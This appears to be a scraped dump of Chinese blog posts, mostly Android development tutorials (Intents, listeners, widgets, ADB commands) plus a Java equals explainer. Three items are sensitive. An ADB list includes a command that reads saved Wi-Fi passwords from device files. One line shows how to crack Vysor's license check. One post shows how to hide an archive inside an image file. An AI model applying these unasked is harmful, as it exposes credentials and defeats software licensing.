} ---- public class B extends AppCompatActivity { private Button button; private TextView textView; private Intent intent; @Override protected void onCreate(@Nullable Bundle savedInstanceState) { super.onCreate(savedInstanceState); setContentView(R.layout.b); button = (Button) findViewById(R.id.b_bt1); textView = (TextView) findViewById(R.id.b_tv1); intent = getIntent(); 接收传入的意图 button.setOnClickListener(new View.OnClickListener() { @Override public void onClick(View view) { if (intent.getStringExtra(\u0026#34;str1\u0026#34;) != null) { 判断是通过按钮一启动还是按钮二启动 textView.setText(intent.getStringExtra(\u0026#34;str1\u0026#34;)); 按钮一，接收并显示数据 } else { intent = new Intent(); 按钮二，新建意图作为容器 intent.putExtra(\u0026#34;str1\u0026#34;, \u0026#34;数据传出\u0026#34;); 放入数据 setResult(2, intent); 传出数据（结果码，意图） finish(); 结束当前 Activity } } }); } } ------------------------------------------------------- 通过 Intent 调用外部浏览器 --- public class MainActivity extends AppCompatActivity { @Override protected void onCreate(@Nullable Bundle savedInstanceState) { super.onCreate(savedInstanceState); setContentView(R.layout.main_activity); Button button = (Button) findViewById(R.id.button); button.setOnClickListener(new View.OnClickListener() { 点击按钮调用外部浏览器打开网页 @Override public void onClick(View v) { Uri uri = Uri.parse(\u0026#34;https://www.bing.com/\u0026#34;); Intent intent = new Intent(Intent.ACTION_VIEW, uri); startActivity(intent); } }); } } 关于 finish() 和 System.exit(0) finish()：结束调用此方法的 Activity 的生命周期，也就是按顺序执行至 onDestroy()。 System.exit(0)：直接停止该 App 的虚拟机，相当于App直接断电，不应该使用此方法。 ","permalink":"https://xhstormr.github.io/blog/posts/android-activity/","summary":"","title":"Android Activity"},{"content":"Updated on 2016-07-16\n== 对于基本数据类型比较的就是数据本身，对于引用数据类型比较的就是内存地址。\nequals 对于引用数据类型比较的也是内存地址；但其中的 String 类比较特殊，重写了继承自 Object 类的 equals 方法，使其比较数据本身。\n打发时间的同时加深理解：)\nclass Demo { public static void main(String[] args) { String a = \u0026#34;123\u0026#34;; String b = \u0026#34;123\u0026#34;; String c = new String(\u0026#34;123\u0026#34;); System.out.println(a == b); System.out.println(a.equals(b)); System.out.println(\u0026#34;--------------\u0026#34;); System.out.println(a == c); System.out.println(a.equals(c)); System.out.println(\u0026#34;--------------\u0026#34;); A a1 = new A(); A a2 = new A(); System.out.println((a1 == a2)); System.out.println(a1.equals(a2)); } } class A { } ---- 输出： true 多次出现的字符串，Java编译程序会将内存地址指向同一对象 true 内容相同 -------------- false 显式 new 了一个对象，内存地址不相同 true 内容相同 -------------- false false ","permalink":"https://xhstormr.github.io/blog/posts/java-equals/","summary":"","title":"关于 Java 中的 == 和 equals"},{"content":"Updated on 2016-07-13\n通过自定义 Android 控件实现多个文本跑马灯效果。\n单个跑马灯 布局文件 \u0026lt;TextView android:id=\u0026#34;@+id/textView1\u0026#34; android:layout_width=\u0026#34;match_parent\u0026#34; android:layout_height=\u0026#34;wrap_content\u0026#34; android:text=\u0026#34;Long Text,Long Text,Long Text.\u0026#34; android:textSize=\u0026#34;30sp\u0026#34; android:singleLine=\u0026#34;true\u0026#34; 强制为单行 android:ellipsize=\u0026#34;marquee\u0026#34; 文字溢出效果为跑马灯（需要在选中状态） android:focusable=\u0026#34;true\u0026#34; 可以设为选中状态 android:focusableInTouchMode=\u0026#34;true\u0026#34; 在触摸模式下可以设为选中状态 /\u0026gt; 多个跑马灯 布局文件 \u0026lt;com.example.system.myapplication.MyTextView 使用自定义控件的类 android:id=\u0026#34;@+id/textView1\u0026#34; android:layout_width=\u0026#34;match_parent\u0026#34; android:layout_height=\u0026#34;wrap_content\u0026#34; android:text=\u0026#34;Long Text,Long Text,Long Text.\u0026#34; android:textSize=\u0026#34;30sp\u0026#34; android:singleLine=\u0026#34;true\u0026#34; 强制为单行 android:ellipsize=\u0026#34;marquee\u0026#34; 文字溢出效果为跑马灯（需要在选中状态） /\u0026gt; \u0026lt;com.example.system.myapplication.MyTextView android:id=\u0026#34;@+id/textView2\u0026#34; android:layout_width=\u0026#34;match_parent\u0026#34; android:layout_height=\u0026#34;wrap_content\u0026#34; android:text=\u0026#34;Long Text,Long Text,Long Text.\u0026#34; android:textSize=\u0026#34;30sp\u0026#34; android:singleLine=\u0026#34;true\u0026#34; android:ellipsize=\u0026#34;marquee\u0026#34; /\u0026gt; ---- 自定义控件的类 - MyTextView public class MyTextView extends TextView { 继承于 TextView 并重写它的 isFocused() 方法 public MyTextView(Context context) { super(context); } public MyTextView(Context context, AttributeSet attrs) { super(context, attrs); } public MyTextView(Context context, AttributeSet attrs, int defStyleAttr) { super(context, attrs, defStyleAttr); } @Override 重写判断是否为焦点的方法 public boolean isFocused() { return true; 始终返回 true，代表一直有焦点 } } ","permalink":"https://xhstormr.github.io/blog/posts/android-custom-controls/","summary":"","title":"自定义 Android 控件"},{"content":"Updated on 2016-07-12\n实现 Android 监听事件的写法主要有5种：匿名内部类、内部类、外部类、接口、XML绑定。\n匿名内部类 Button button1 = (Button) findViewById(R.id.but1); //向下类型转换 button1.setOnClickListener(new View.OnClickListener() { //直接 new 接口 @Override //实现接口方法 public void onClick(View view) { System.out.println(\u0026#34;按钮1\u0026#34;); } }); 内部类 public class FirstActivity extends AppCompatActivity { @Override protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); setContentView(R.layout.first_layout); Button button1 = (Button) findViewById(R.id.but1); Button button2 = (Button) findViewById(R.id.but2); button1.setOnClickListener(A); //使用内部类对象 button2.setOnClickListener(A); //使用内部类对象 } private View.OnClickListener A = new View.OnClickListener() { @Override public void onClick(View v) { Log.i(\u0026#34;Tag\u0026#34;, \u0026#34;有按钮被点击\u0026#34;); switch (v.getId()) { case R.id.but1: Toast.makeText(FirstActivity.this, \u0026#34;按钮1\u0026#34;, Toast.LENGTH_SHORT).show(); break; case R.id.but2: Toast.makeText(FirstActivity.this, \u0026#34;按钮2\u0026#34;, Toast.LENGTH_SHORT).show(); break; } } }; } 外部类 Button button1 = (Button) findViewById(R.id.but1); Button button2 = (Button) findViewById(R.id.but2); button1.setOnClickListener(new A() { //新建外部类对象 @Override public void onClick(View v) { super.onClick(v); System.out.println(\u0026#34;按钮1\u0026#34;); } }); button2.setOnClickListener(new A() { @Override //子类重写父类的方法 public void onClick(View v) { super.onClick(v); //同时调用父类的方法 System.out.println(\u0026#34;按钮2\u0026#34;); } }); ---- public class A implements View.OnClickListener { @Override //父类实现接口的方法 public void onClick(View v) { System.out.println(\u0026#34;有按钮被点击\u0026#34;); } } 接口 public class FirstActivity extends AppCompatActivity implements View.OnClickListener { @Override protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); setContentView(R.layout.first_layout); Button button1 = (Button) findViewById(R.id.but1); Button button2 = (Button) findViewById(R.id.but2); button1.setOnClickListener(this); //自己实现了接口 button2.setOnClickListener(this); //自己实现了接口 } @Override 实现接口方法 public void onClick(View v) { Log.i(\u0026#34;Tag\u0026#34;, \u0026#34;有按钮被点击\u0026#34;); switch (v.getId()) { case R.id.but1: Toast.makeText(this, \u0026#34;按钮1\u0026#34;, Toast.LENGTH_SHORT).show(); break; case R.id.but2: Toast.makeText(this, \u0026#34;按钮2\u0026#34;, Toast.LENGTH_SHORT).show(); break; } } } XML绑定 布局文件 \u0026lt;Button android:onClick=\u0026#34;a\u0026#34; //重点就是 onClick 属性 android:id=\u0026#34;@+id/but1\u0026#34; android:layout_width=\u0026#34;match_parent\u0026#34; android:layout_height=\u0026#34;wrap_content\u0026#34; android:text=\u0026#34;按钮1\u0026#34; android:textSize=\u0026#34;30sp\u0026#34;/\u0026gt; ---- Activity 文件 public class FirstActivity extends AppCompatActivity { @Override protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); setContentView(R.layout.first_layout); //引入布局文件 } public void a(View view) { //对应实现布局文件中 ID 为 but1 的按钮点击事件 Log.i(\u0026#34;Tag\u0026#34;, \u0026#34;有按钮被点击\u0026#34;); //在控制台输出信息 Toast.makeText(this, \u0026#34;按钮1\u0026#34;, Toast.LENGTH_SHORT).show(); //在APP中显示信息 } } ","permalink":"https://xhstormr.github.io/blog/posts/android-listener/","summary":"","title":"实现 Android 监听事件"},{"content":"Updated on 2016-07-06\nCMD:\ncopy /b a.png + b.7z c.png REG:\nWindows Registry Editor Version 5.00 [HKEY_CLASSES_ROOT\\Directory\\Background\\shell\\在此处打开命令窗口] \u0026#34;Icon\u0026#34;=\u0026#34;C:\\\\Windows\\\\System32\\\\cmd.exe\u0026#34; [HKEY_CLASSES_ROOT\\Directory\\Background\\shell\\在此处打开命令窗口\\command] @=\u0026#34;cmd.exe /s /k pushd \\\u0026#34;%V\\\u0026#34;\u0026#34; Windows Registry Editor Version 5.00 [HKEY_CLASSES_ROOT\\*\\shell\\用 7z 打开] \u0026#34;Icon\u0026#34;=\u0026#34;D:\\\\Program Files\\\\7-Zip\\\\7zFM.exe\u0026#34; [HKEY_CLASSES_ROOT\\*\\shell\\用 7z 打开\\command] @=\u0026#34;\\\u0026#34;D:\\\\Program Files\\\\7-Zip\\\\7zFM.exe\\\u0026#34; \\\u0026#34;%1\\\u0026#34;\u0026#34; RES:\n","permalink":"https://xhstormr.github.io/blog/posts/file-into-picture/","summary":"","title":"将文件伪装成图片"},{"content":"Updated on 2016-08-27\nhttps://developers.google.cn/\nhttps://developer.android.google.cn/\nhttps://developer.android.google.cn/reference/kotlin/classes.html\nhttps://developer.android.google.cn/reference/tools/gradle-api/\nhttps://maven.google.com/web/\napi level\n开发环境 IntelliJ IDEA：https://www.jetbrains.com/idea/download/ Eclipse + ADT 已被 Google 弃用 Android SDK：https://developer.android.com/studio/index.html#win-tools2 Mirror1 Gradle：https://services.gradle.org/distributions/ GRADLE_HOME ➜ D:\\Download\\Java\\gradle-2.14 PATH ➜ %GRADLE_HOME%\\bin JDK：http://www.oracle.com/technetwork/java/javase/downloads/index.html 新建 Android 项目卡住 IDEA 的 Android 构建工具是 Gradle，新建项目时会联网下载对应版本的 Gradle 和 Cache。\nGradle： C:\\Users\\XhstormR\\IntelliJIDEAProjects\\MyApplication\\gradle\\wrapper\\gradle-wrapper.properties ⇳ distributionUrl=http\\://android-mirror.bugly.qq.com:8080/gradle/gradle-3.2.1-all.zip Cache： C:\\Users\\XhstormR\\IntelliJIDEAProjects\\MyApplication\\build.gradle ⇳ repositories { maven { url \u0026#34;http://maven.aliyun.com/nexus/content/groups/public/\u0026#34; } } 找不到主题文件 \u0026lt;style name=\u0026#34;AppTheme\u0026#34; parent=\u0026#34;@android:style/Theme.DeviceDefault.Light.NoActionBar\u0026#34;\u0026gt; 找不到资源文件 IDEA ➜ Build ➜ Make Project or Rebuild Project（重新生成 R.java）\n没有 Assets 文件夹 IDEA ➜ File ➜ New ➜ Folder ➜ Assets Folder（src/main/assets/）\n导入 SDK 源码 IDEA ➜ File ➜ Project Structure ➜ SDKs ➜ Sourcepath\nAndroid Debug Bridge 手机开启 USB 调试模式 电脑安装 Android USB 驱动 adb start-server 启动 ADB adb kill-server 停止 ADB adb root 使 ADBD 获得 ROOT 权限 adb reboot 重启手机 adb reboot recovery 重启至 Recovery 模式 adb reboot bootloader 重启至 Fastboot 模式 adb install D:\\Download\\1.apk 安装 App -r 允许覆盖安装 -d 允许降级安装 adb uninstall com.baidu.mobile 卸载 App（包名） -k 保留数据和缓存 adb push D:\\Download\\1.txt /mnt/sdcard/Download/1.txt 发送至手机 adb pull /mnt/sdcard/Download/1.txt D:\\Download\\1.txt 下载至电脑 ---- /mnt/sdcard/Download/ \u0026lt;=\u0026gt; /storage/emulated/0/Download/ D:\\Download\\Java\\android-sdk-windows\\platform-tools\\adb.exe devices -l 查看设备 List of devices attached 0123456789ABCDEF device product:2013023 model:2013023 device:HM2013023 D:\\Download\\Java\\android-sdk-windows\\platform-tools\\adb.exe shell 登录设备 shell@HM2013023:/ $ su root@HM2013023:/ # ls root@HM2013023:/ # exit wm size 查看屏幕分辨率 wm density 查看屏幕密度 dumpsys window displays 查看显示屏参数 screencap -p /sdcard/123.png 截图 screenrecord /sdcard/123.mp4 录屏 date -s 20160823.131500 设置日期和时间 cat /system/build.prop 查看硬件和系统属性 cat /data/misc/wifi/*.conf 查看连接过的 WIFI 密码 PackageManager pm list packages 显示所有应用 -d 禁用的应用 -e 启用的应用 -3 第三方应用 -s 系统应用 pm list packages google 包名带 google 字段的应用 pm clear com.baidu.mobile 清除数据和缓存 pm list users 查看用户 pm list libraries 查看系统安装的库 pm list features 查看系统支持的功能 （总应用个数 = 禁用+启用 = 系统+第三方） ActivityManager am start -n com.example.app/.ExampleActivity -es str ABC 调用 Activity 并发送数据 extra string（Key-Value） am start -a android.intent.action.CALL -d tel:10086 发送 Intent（拨打电话） am start -a android.intent.action.VIEW -d http://xhstormr.tk/ 发送 Intent（打开网站） am startservice ... 调用 Service am broadcast ... 发送广播 am force-stop com.baidu.mobile 强制停止 App dumpsys activity activities | grep mFocusedActivity 查看前台 Activity /data/property/persist.sys.usb.config 配置 USB ⇳ mtp,adb 作为媒体设备,开启调试模式 远程 ADB adb devices -l List of devices attached 10.32.17.39:1234 device product:2013023 model:2013023 device:HM2013023 启动 adb tcpip 1234 连接手机 adb connect 10.32.17.39:1234 停止 adb disconnect adb usb 连接手机 Vysor Link：WebStore,Github 破解：uglify.js ➜ function e(){this.licensed=true;this.licenseCached=true} SDK Manager nslookup g.cn sdkmanager.bat --no_https --proxy=http --proxy_host=203.208.39.242 --proxy_port=80 --list sdkmanager.bat --no_https --proxy=http --proxy_host=203.208.39.242 --proxy_port=80 --update sdkmanager.bat --no_https --proxy=http --proxy_host=203.208.39.242 --proxy_port=80 \u0026#34;platforms;android-24\u0026#34; sdkmanager.bat --no_https --proxy=http --proxy_host=203.208.39.242 --proxy_port=80 --uninstall \u0026#34;platforms;android-24\u0026#34; Installed packages: Path | Version | Description | Location ------- | ------- | ------- | ------- build-tools;25.0.1 | 25.0.1 | Android SDK Build-Tools 25.0.1 | build-tools\\25.0.1\\ extras;android;m2repository | 40.0.0 | Android Support Repository | extras\\android\\m2repository\\ extras;google;m2repository | 40 | Google Repository | extras\\google\\m2repository\\ extras;m2reposi...ver;1.0.0-beta4 | 1 | Solver for ConstraintLayout 1.... | extras\\m2reposi...er\\1.0.0-beta4\\ extras;m2reposi...out;1.0.0-beta4 | 1 | ConstraintLayout for Android 1... | extras\\m2reposi...ut\\1.0.0-beta4\\ platform-tools | 25.0.1 | Android SDK Platform-Tools 25.0.1 | platform-tools\\ platforms;android-24 | 2 | Android SDK Platform 24 | platforms\\android-24\\ sources;android-24 | 1 | Sources for Android 24 | sources\\android-24\\ tools | 25.2.3 | Android SDK Tools 25.2.3 | tools\\ set -x ANDROID_SDK_ROOT $HOME/android/sdk set -e ANDROID_SDK_ROOT yes | ./sdkmanager --sdk_root=$ANDROID_SDK_ROOT --licenses ./sdkmanager --sdk_root=$ANDROID_SDK_ROOT --list ./sdkmanager --sdk_root=$ANDROID_SDK_ROOT --update ./sdkmanager --sdk_root=$ANDROID_SDK_ROOT emulator platform-tools \u0026#34;platforms;android-29\u0026#34; \u0026#34;system-images;android-29;default;x86_64\u0026#34; ./avdmanager create avd -n test -d pixel -k \u0026#34;system-images;android-29;default;x86_64\u0026#34; -f ./avdmanager delete avd -n test Android 规范 Android Design Android 组件：所有组件都需要在 AndroidManifest.xml ➜ application 里进行注册。 活动（Activity）：一种包含用户界面的组件，主要用于和用户进行交互。 服务（Service）：用于实现程序后台运行的组件，不需要和用户交互。 广播接收器（Broadcast Receiver）：用于接收和发送广播的组件。 内容提供器（Content Provider）：用于实现不同应用程序之间共享数据的组件。 控件属性： sp：Scale-independent Pixels（可伸缩像素），文字尺寸一律使用 sp 单位。 dp：Density-independent Pixels（密度无关像素），非文字尺寸使用 dp 单位。 orientation（方向）：horizontal（水平） | vertical（垂直） wrap_content：包裹内容。 match_parent：铺满容器。 layout_weight：占据父容器 剩余空间 的比例。外 假设屏幕宽度为 X，2个控件的宽度都为 match_parent 的情况下，原有宽度为 X，2个控件的宽度也都为 X，那么剩余宽度为 X-(X+X)=-X；左边的控件占三分之一，所以左边总宽度为 X+(-X)*(1/3)=(2/3)X。 建议将 width 或 height 设为 0dp，这样就可以理解为屏占比了。 margin：外边距，控件边框与控件边框的距离。外 padding：内边距，控件边框与控件内容的距离。里 layout_gravity：控件位置。外 gravity：内容位置。里 布局优化：布局层次一样的情况下，LinearLayout 的性能要稍高于 RelativeLayout。 include：将可重用的布局提取出来并通过 include 标签导入使用。 merge：若通过 include 标签导入的布局不需要顶节点，可以将顶节点标签替换为merge，顶节点会被直接忽略而子控件会被直接导入，以降低布局嵌套层次。 ViewStub：导入的布局会惰性加载，在创建主布局时不进行实例化，需要在代码中手动实例化，以节省内存并加快布局创建速度。（不支持导入 merge 布局） ListView：以 列表 形式显示条目的控件。（行） 数据适配器：把复杂的数据绑定至指定控件上，是数据源和控件之间的桥梁。 ArrayAdapter（数组适配器）：用于绑定格式单一的数据。（数组或集合） SimpleAdapter（简单适配器）：用于绑定格式复杂的数据。（特定泛型集合） 事件监听器：监听某种动作行为并做出响应，是程序和用户系统交互的桥梁。 OnItemClickListener：监听列表中单个条目的点击事件。 OnScrollListener：监听列表的滚动。 GridView：以 表格 形式显示条目的控件。（格）（可以用于替代 TableLayout 布局） Spinner：以 下拉列表 形式显示条目的控件。（行） DatePicker \u0026amp;\u0026amp; TimePicker：日期选择器 \u0026amp;\u0026amp; 时间选择器。 ProgressBar：环形进度条、水平进度条（精确）。 SeekBar：拖动条，ProgressBar 的子类。 WebView：显示网页的控件。 ViewFlipper：多页面自动轮播并且带有动画效果的控件。 setInAnimation() ⟺ setOutAnimation()：设置进入(退出)屏幕时的动画。 showPrevious() ⟺ showNext()：显示前(后)一页。 startFlipping() ⟺ stopFlipping()：开始(停止)循环切换。 setFlipInterval()：设置切换页面的时间间隔，eg. 1s = 1000。 ScrollView：包裹的子控件屏幕显示不完全，需要通过滚动来显示完整的控件。 ScrollView 垂直滚动，HorizontalScrollView 水平滚动。 getScrollY()：获得滚动条的滚动距离。 scrollTo()：使滚动条移动至指定位置。 scrollBy()：使滚动条的滚动距离增加或减少。 getHeight()：获得控件的高度。（在 onLayout 方法运行后被确定） getMeasuredHeight()：获得控件的高度。（在 onMeasure 方法运行后被确定） 在 onLayout 方法中使用 getMeasuredHeight()，除此之外都使用getHeight()。 Gallery：画廊、缩略图浏览器。 ImageSwitcher：用于显示图片并切换的控件，可以设置切换时的动画效果。 ImageView 的选择器，需要实现 ViewFactory 中的 makeView() 方法为其返回 ImageView。 SVG Code AutoCompleteTextView 布局文件 \u0026lt;AutoCompleteTextView android:id=\u0026#34;@+id/autoCompleteTextView\u0026#34; android:layout_width=\u0026#34;match_parent\u0026#34; android:layout_height=\u0026#34;wrap_content\u0026#34; android:hint=\u0026#34;请输入关键词\u0026#34; 输入文本提示 android:completionThreshold=\u0026#34;2\u0026#34; 输入 2 个字符时开始匹配 /\u0026gt; ---- Activity 文件 public class FirstActivity extends AppCompatActivity { private String[] res = {\u0026#34;beijing1\u0026#34;, \u0026#34;beijing2\u0026#34;, \u0026#34;beijing3\u0026#34;, \u0026#34;shanghai1\u0026#34;, \u0026#34;shanghai2\u0026#34;, \u0026#34;shanghai3\u0026#34;}; 数据源 @Override protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); setContentView(R.layout.first_layout); AutoCompleteTextView a = (AutoCompleteTextView) findViewById(R.id.autoCompleteTextView); 1控件 ArrayAdapter\u0026lt;String\u0026gt; adapter = new ArrayAdapter\u0026lt;String\u0026gt;(this, android.R.layout.simple_list_item_1, res); 2适配器（上下文对象，布局文件，数据源） a.setAdapter(adapter); 3将控件与适配器绑定 a.setTokenizer(new MultiAutoCompleteTextView.CommaTokenizer()); 4如果是 MultiAutoCompleteTextView 还需要设置分隔符 } } ------------------------------------------------------- ToggleButton 布局文件 \u0026lt;ToggleButton android:id=\u0026#34;@+id/toggleButton\u0026#34; android:layout_width=\u0026#34;match_parent\u0026#34; android:layout_height=\u0026#34;wrap_content\u0026#34; android:checked=\u0026#34;false\u0026#34; 默认为关 android:textOff=\u0026#34;关\u0026#34; android:textOn=\u0026#34;开\u0026#34; /\u0026gt; \u0026lt;ImageView android:id=\u0026#34;@+id/imageView\u0026#34; android:layout_width=\u0026#34;match_parent\u0026#34; android:layout_height=\u0026#34;match_parent\u0026#34; android:background=\u0026#34;@drawable/png_off\u0026#34; 默认为关的图片 /\u0026gt; ---- Activity 文件 public class FirstActivity extends AppCompatActivity implements CompoundButton.OnCheckedChangeListener { 1通过接口方式实现监听器 private ToggleButton toggleButton; private ImageView imageView; @Override protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); setContentView(R.layout.first_layout); toggleButton = (ToggleButton) findViewById(R.id.toggleButton); imageView = (ImageView) findViewById(R.id.imageView); toggleButton.setOnCheckedChangeListener(this); 3设置监听器 } @Override 2实现接口方法 public void onCheckedChanged(CompoundButton buttonView, boolean isChecked) { imageView.setBackgroundResource(isChecked ? R.drawable.png_on : R.mipmap.png_off); 通过三元运算符来判断开关状态设置 imageView 的背景图片 } } ------------------------------------------------------- CheckBox 布局文件 \u0026lt;CheckBox android:id=\u0026#34;@+id/checkBox\u0026#34; android:layout_width=\u0026#34;match_parent\u0026#34; android:layout_height=\u0026#34;wrap_content\u0026#34; android:text=\u0026#34;篮球\u0026#34; android:textAlignment=\u0026#34;center\u0026#34; android:layout_gravity=\u0026#34;center\u0026#34; /\u0026gt; \u0026lt;CheckBox android:id=\u0026#34;@+id/checkBox2\u0026#34; android:layout_width=\u0026#34;match_parent\u0026#34; android:layout_height=\u0026#34;wrap_content\u0026#34; android:text=\u0026#34;足球\u0026#34; android:textAlignment=\u0026#34;center\u0026#34; android:layout_gravity=\u0026#34;center\u0026#34; /\u0026gt; ---- Activity 文件 public class FirstActivity extends AppCompatActivity implements CompoundButton.OnCheckedChangeListener { 通过接口方式实现监听器 @Override protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); setContentView(R.layout.first_layout); CheckBox checkBox = (CheckBox) findViewById(R.id.checkBox); CheckBox checkBox2 = (CheckBox) findViewById(R.id.checkBox2); checkBox.setOnCheckedChangeListener(this); 设置监听器 checkBox2.setOnCheckedChangeListener(this); 设置监听器 } @Override public void onCheckedChanged(CompoundButton compoundButton, boolean b) { Log.i(\u0026#34;Tag\u0026#34;, b + \u0026#34;\u0026#34;); if (b) { Toast.makeText(compoundButton.getContext(), \u0026#34;选中\u0026#34; + compoundButton.getText().toString(), Toast.LENGTH_SHORT).show(); } else { ⇳ （上下文对象，字符串消息，显示时间） Toast.makeText(compoundButton.getContext(), \u0026#34;取消\u0026#34; + compoundButton.getText().toString(), Toast.LENGTH_SHORT).show(); } } } ------------------------------------------------------- RadioGroup \u0026amp;\u0026amp; RadioButton 布局文件 \u0026lt;RadioGroup android:id=\u0026#34;@+id/radioGroup\u0026#34; android:orientation=\u0026#34;horizontal\u0026#34; 水平排列 android:layout_width=\u0026#34;wrap_content\u0026#34; android:layout_height=\u0026#34;wrap_content\u0026#34;\u0026gt; \u0026lt;RadioButton android:id=\u0026#34;@+id/radioButton\u0026#34; android:layout_width=\u0026#34;wrap_content\u0026#34; android:layout_height=\u0026#34;wrap_content\u0026#34; android:checked=\u0026#34;true\u0026#34; 默认选中 android:text=\u0026#34;男\u0026#34;/\u0026gt; \u0026lt;RadioButton android:id=\u0026#34;@+id/radioButton2\u0026#34; android:layout_width=\u0026#34;wrap_content\u0026#34; android:layout_height=\u0026#34;wrap_content\u0026#34; android:text=\u0026#34;女\u0026#34;/\u0026gt; \u0026lt;/RadioGroup\u0026gt; ---- Activity 文件 public class FirstActivity extends AppCompatActivity implements RadioGroup.OnCheckedChangeListener { @Override ↳ 注意是实现 RadioGroup 类的监听方法，而不是 CompoundButton 类的 protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); setContentView(R.layout.first_layout); RadioGroup radioGroup = (RadioGroup) findViewById(R.id.radioGroup); radioGroup.setOnCheckedChangeListener(this); } @Override public void onCheckedChanged(RadioGroup radioGroup, @IdRes int i) { switch (i) { case R.id.radioButton: Log.i(\u0026#34;Tag\u0026#34;, \u0026#34;性别为男\u0026#34;); break; case R.id.radioButton2: Log.i(\u0026#34;Tag\u0026#34;, \u0026#34;性别为女\u0026#34;); break; } } } ------------------------------------------------------- ListView 布局文件 main_activity.xml ⇳ \u0026lt;ListView android:scrollbars=\u0026#34;vertical\u0026#34; 显示垂直滚动条 android:layout_width=\u0026#34;match_parent\u0026#34; android:layout_height=\u0026#34;wrap_content\u0026#34; android:id=\u0026#34;@+id/listView\u0026#34;/\u0026gt; item.xml 简单适配器的自定义布局文件 ⇳ \u0026lt;ImageView android:layout_width=\u0026#34;wrap_content\u0026#34; android:layout_height=\u0026#34;wrap_content\u0026#34; android:src=\u0026#34;@mipmap/ic_launcher\u0026#34; android:id=\u0026#34;@+id/imageView\u0026#34;/\u0026gt; \u0026lt;TextView android:layout_width=\u0026#34;wrap_content\u0026#34; android:layout_height=\u0026#34;wrap_content\u0026#34; android:text=\u0026#34;Test\u0026#34; android:id=\u0026#34;@+id/textView\u0026#34;/\u0026gt; ---- Activity 文件 public class MainActivity extends AppCompatActivity implements AdapterView.OnItemClickListener, AbsListView.OnScrollListener { private String[] data1 = {\u0026#34;1\u0026#34;, \u0026#34;2\u0026#34;, \u0026#34;3\u0026#34;, \u0026#34;4\u0026#34;, \u0026#34;5\u0026#34;, \u0026#34;6\u0026#34;}; 数据源 @Override protected void onCreate(@Nullable Bundle savedInstanceState) { super.onCreate(savedInstanceState); setContentView(R.layout.main_activity); ListView listView = (ListView) findViewById(R.id.listView); 1控件 ArrayAdapter\u0026lt;String\u0026gt; arrayAdapter = new ArrayAdapter\u0026lt;\u0026gt;(this, android.R.layout.simple_list_item_1, data1); listView.setAdapter(arrayAdapter); 3将控件与适配器绑定 ↳ 2数组适配器（上下文对象，布局文件，数据源） SimpleAdapter simpleAdapter = new SimpleAdapter(this, getdata(), R.layout.item, new String[]{\u0026#34;image\u0026#34;, \u0026#34;text\u0026#34;}, new int[]{R.id.imageView, R.id.textView}); listView.setAdapter(simpleAdapter); 3将控件与适配器绑定 ↳ 2简单适配器（上下文对象，数据源，布局文件，索引(Map中的键名)，绑定控件ID(与索引成对应关系)） listView.setOnItemClickListener(this); 监听点击条目 listView.setOnScrollListener(this); 监听滚动变化 } private List\u0026lt;Map\u0026lt;String, Object\u0026gt;\u0026gt; getdata() { 数据源：由许多 Map 所组成的 List 集合，一个 Map 对应一个条目 List\u0026lt;Map\u0026lt;String, Object\u0026gt;\u0026gt; data2 = new ArrayList\u0026lt;\u0026gt;(); for (int i = 0; i \u0026lt; 6; i++) { Map\u0026lt;String, Object\u0026gt; map = new HashMap\u0026lt;\u0026gt;(); map.put(\u0026#34;image\u0026#34;, R.mipmap.ic_launcher); (键,值) map.put(\u0026#34;text\u0026#34;, \u0026#34;文本\u0026#34; + i); data2.add(map); } return data2; } @Override public void onScroll(AbsListView view, int firstVisibleItem, int visibleItemCount, int totalItemCount) { if (firstVisibleItem == 0) { Log.i(\u0026#34;Tag\u0026#34;, \u0026#34;在顶部\u0026#34;); } if (firstVisibleItem + visibleItemCount == totalItemCount) { Log.i(\u0026#34;Tag\u0026#34;, \u0026#34;在底部\u0026#34;); } } @Override public void onScrollStateChanged(AbsListView view, int scrollState) { 滚动变化 switch (scrollState) { case SCROLL_STATE_TOUCH_SCROLL: Log.i(\u0026#34;Tag\u0026#34;, \u0026#34;1正在滚动(手指未离开)\u0026#34;); break; case SCROLL_STATE_FLING: Log.i(\u0026#34;Tag\u0026#34;, \u0026#34;2正在滑动(手指已离开)\u0026#34;); break; case SCROLL_STATE_IDLE: Log.i(\u0026#34;Tag\u0026#34;, \u0026#34;3停止滚动\u0026#34;); break; } } @Override public void onItemClick(AdapterView\u0026lt;?\u0026gt; parent, View view, int position, long id) { 点击条目 Toast.makeText(this, position + \u0026#34;\\n\u0026#34; + parent.getItemAtPosition(position).toString(), Toast.LENGTH_SHORT).show(); } ↳ 显示索引位置和对应数据源中的数据 } 下滑增加新条目 case SCROLL_STATE_FLING: Map\u0026lt;String, Object\u0026gt; map = new HashMap\u0026lt;\u0026gt;(); map.put(\u0026#34;image\u0026#34;, R.mipmap.ic_launcher); map.put(\u0026#34;text\u0026#34;, \u0026#34;新条目\u0026#34;); data2.add(map); simpleAdapter.notifyDataSetChanged(); 更新控件数据，同步 UI 线程 break; ------------------------------------------------------- DatePicker \u0026amp;\u0026amp; TimePicker 布局文件 \u0026lt;DatePicker android:layout_width=\u0026#34;wrap_content\u0026#34; android:layout_height=\u0026#34;wrap_content\u0026#34; android:id=\u0026#34;@+id/datePicker\u0026#34;/\u0026gt; \u0026lt;TimePicker android:layout_width=\u0026#34;wrap_content\u0026#34; android:layout_height=\u0026#34;wrap_content\u0026#34; android:id=\u0026#34;@+id/timePicker\u0026#34;/\u0026gt; ---- Activity 文件 public class MainActivity extends AppCompatActivity { @Override protected void onCreate(@Nullable Bundle savedInstanceState) { super.onCreate(savedInstanceState); setContentView(R.layout.main_activity); DatePicker datePicker = (DatePicker) findViewById(R.id.datePicker); TimePicker timePicker = (TimePicker) findViewById(R.id.timePicker); Calendar calendar = Calendar.getInstance(); java.util.Calendar 类 int year = calendar.get(Calendar.YEAR); 年 int month = calendar.get(Calendar.MONTH) + 1; 月（从零开始） int day = calendar.get(Calendar.DAY_OF_MONTH); 日 int hour = calendar.get(Calendar.HOUR_OF_DAY); 小时 int minute = calendar.get(Calendar.MINUTE); 分钟 setTitle(year + \u0026#34;-\u0026#34; + month + \u0026#34;-\u0026#34; + day + \u0026#34;-\u0026#34; + hour + \u0026#34;:\u0026#34; + 